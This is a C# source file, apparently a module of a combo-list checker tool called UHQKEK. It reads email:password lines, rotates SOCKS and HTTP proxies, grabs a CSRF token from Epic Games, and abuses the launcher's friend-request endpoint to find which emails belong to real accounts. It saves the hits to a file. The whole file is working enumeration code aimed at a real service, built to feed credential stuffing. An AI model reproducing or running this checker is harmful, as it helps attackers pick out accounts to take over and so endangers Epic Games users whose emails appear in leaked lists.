using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class EpicGames
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                httpRequest.AddHeader("Accept-Language", "fr-FR,fr;q=0.9");
                httpRequest.AddHeader("Host", "www.epicgames.com");
                httpRequest.AddHeader("sec-ch-ua", "\" Not; A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36");
                httpRequest.AddHeader("X-Epic-Event-Action", "login");
                httpRequest.AddHeader("X-Epic-Event-Category", "login");
                httpRequest.AddHeader("X-Epic-Strategy-Flags", "minorPreRegisterEnabled=true;guardianKwsFlowEnabled=true");
                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                string str1 = httpRequest.Get("https://www.epicgames.com/id/api/csrf").ToString();
                string str2 = httpRequest.Cookies.GetCookies("https://www.epicgames.com/id/api/csrf")["XSRF-TOKEN"].ToString();
                str2 = str2.Replace("XSRF-TOKEN=", "");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                httpRequest.AddHeader("Host", "accounts.launcher-website-prod07.ol.epicgames.com");
                httpRequest.AddHeader("Origin", "https://accounts.launcher-website-prod07.ol.epicgames.com");
                httpRequest.AddHeader("Referer", "https://accounts.launcher-website-prod07.ol.epicgames.com/launcher/addFriends");
                httpRequest.AddHeader("sec-ch-ua", "\" Not; A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36");
                httpRequest.AddHeader("X-XSRF-TOKEN", str2);
                string str3 = httpRequest.Post("https://accounts.launcher-website-prod07.ol.epicgames.com/launcher/sendFriendRequest", "inputEmail=" + strArray1[0] + "&tab=connections", "").ToString();
                if (str3.Contains("fieldValidationError\" > Veuillez vous connecter"))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Green);
                    }
                    Program.Save(combo, "EpicGames VM");
                    return true;
                }
                else if (str3.Contains("compte est introuvable"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    ////Program.Save(combo, "Invalids");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }

            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
